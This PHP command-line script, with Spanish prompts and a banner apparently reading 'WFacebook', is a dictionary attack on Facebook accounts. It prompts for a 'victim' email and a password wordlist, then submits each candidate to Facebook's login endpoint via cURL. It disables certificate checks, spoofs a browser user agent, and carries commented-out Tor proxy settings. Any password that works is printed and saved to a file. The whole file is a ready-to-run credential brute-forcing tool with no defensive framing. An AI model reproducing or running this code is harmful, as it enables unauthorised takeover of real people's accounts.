<?php
exec('reset');
set_time_limit(0);
fwrite(STDOUT, "\n\033[1;37m Ingrese Mail de victima:\033[0m ");
$line1 = trim(fgets(STDIN));

fwrite(STDOUT, "\n\033[1;37m Ingrese Diccionario    :\033[0m ");
$dicw = trim(fgets(STDIN));

//fwrite(STDOUT, "\n\033[1;37m Ingrese Puerto de Proxy:\033[0m ");
//$portor1 = trim(fgets(STDIN));

$username =$line1;
$dictionary =$dicw;

function kontrol($kullaniciadi,$sifre){
/*
Mozilla/5.0 (X11; U; Linux x86_64; ja-JP; rv:1.9.2.16) Gecko/20110323 Ubuntu/10.10 (maverick) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a
Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13
*/
	//$portor=50523;//portor1;
	$useragent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12";
	//$useragent = "Opera/9.21 (Windows NT 5.1; U; tr)"; 
	$data = "email=$kullaniciadi&pass=$sifre&login=Login" ;
	$ch = curl_init('https://login.facebook.com/login.php?login_attempt=1');
	//$ch = curl_init('https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php');

	//curl_setopt($ch, CURLOPT_PROXY, 'https://127.0.0.1:'.$portor.'/');//tor
	//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	curl_setopt($ch, CURLOPT_HEADER, 0); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_POST, 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent); 
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt'); 
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');

	$source=curl_exec ($ch); curl_close ($ch);
	if(eregi("Home",$source)){
		return true;
	} else {
		return false;
	}
}

if(!is_file($dictionary)){
	echo "\n\033[1;31m No existe el Diccionario:\033[0m $dictionary\n";
	exit;
} 

$lines=file($dictionary);
$count = count($lines);
exec('reset');
print "\033[1;32m
 .  ..___         .        .  
 |  |[__  _. _. _ |_  _  _ ;_/
 |/\||   (_](_.(/,[_)(_)(_)| \ \033[0m\033[0;32mVersion 1.0 \033[0m                        
";

echo "\n\033[1;34m Iniciando Ataque\033[0m\n";sleep(2);
echo "\033[1;34m Ataque en Ejecucion...\033[0m\n\n";
echo "\033[1;35m ---------------------------\033[0m\n\n";
echo "\033[1m DATOS DEL PROCESO\033[0m\n";
echo "\033[1;34m Escaneando usuario:\033[0m \033[1;37m$username\033[0m\n";
echo "\033[1;34m Posibles Password :\033[0m \033[1;37m$count\033[0m\n\n";
echo "\033[1;35m ---------------------------\033[0m\n\n";
echo "\033[1m INYECTANDO DATOS\033[0m\n";

$ii=0;
foreach($lines as $line){ 
	$line=str_replace("\r","",$line); 
	$line=str_replace("\n","",$line);
	if(kontrol($username,$line)){
		echo "\033[1;32m [+] Password OK :\033[0m \033[1;33m$line\033[0m\n\n";/*- \033[1;37m$porcentaje%\033[0m\n\n";*/
		$fp=fopen('cookie.txt','w');
		fwrite($fp,"user: $username pass: $line");
		fclose($fp);
		exit;
	}else{
		$porcentaje=($ii/$count)*100;
		$porcentaje=round($porcentaje,0);
		echo "\033[1;34m Porcentaje Avance:\033[0m \033[1;37m$porcentaje%\033[0m - \033[1;34m$line\033[0m\n";
		//echo "\033[1;31m [-] Password NO :\033[0m \033[1;34m$line\033[0m\n";
	}
$ii++;
}
//echo "\n\n\033[1;31m Escaneo Finalizado al\033[0m \033[1;37m100% \033[1;31msin Exito.\033[0m\n\n";
?>  
